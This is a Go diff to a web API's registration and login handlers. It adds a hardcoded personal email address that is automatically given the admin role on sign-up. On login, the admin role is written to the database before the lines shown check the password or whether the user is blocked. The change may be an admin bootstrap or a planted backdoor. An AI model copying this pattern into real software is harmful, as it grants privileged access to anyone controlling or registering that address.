@@ -29,6 +29,19 @@ var allowedListingStatuses = map[string]struct{}{
 	"pending": {},
 }
 
+var adminEmails = map[string]struct{}{
+	"6353577@gmail.com": {},
+}
+
+func normalizeEmail(email string) string {
+	return strings.ToLower(strings.TrimSpace(email))
+}
+
+func shouldAssignAdminRole(email string) bool {
+	_, ok := adminEmails[normalizeEmail(email)]
+	return ok
+}
+
 func normalizeStatus(status string) string {
 	normalized := strings.ToLower(strings.TrimSpace(status))
 	if normalized == "" {
@@ -124,7 +137,10 @@ func (a *API) Register(c *gin.Context) {
 		response.Error(c, http.StatusBadRequest, "invalid request")
 		return
 	}
-	user := User{Email: strings.ToLower(strings.TrimSpace(req.Email)), Role: "user"}
+	user := User{Email: normalizeEmail(req.Email), Role: "user"}
+	if shouldAssignAdminRole(user.Email) {
+		user.Role = "admin"
+	}
 	if err := a.db.Create(&user).Error; err != nil {
 		response.Error(c, http.StatusBadRequest, "user already exists")
 		return
@@ -140,9 +156,16 @@ func (a *API) Login(c *gin.Context) {
 		return
 	}
 	var user User
-	if err := a.db.Where("email = ?", strings.ToLower(strings.TrimSpace(req.Email))).First(&user).Error; err != nil {
+	if err := a.db.Where("email = ?", normalizeEmail(req.Email)).First(&user).Error; err != nil {
 		response.Error(c, http.StatusUnauthorized, "invalid credentials")
 		return
+	}
+	if shouldAssignAdminRole(user.Email) && user.Role != "admin" {
+		user.Role = "admin"
+		if err := a.db.Model(&user).Update("role", "admin").Error; err != nil {
+			response.Error(c, http.StatusInternalServerError, "failed to update user role")
+			return
+		}
 	}
 	if user.IsBlocked {
 		response.Error(c, http.StatusForbidden, "user is blocked")
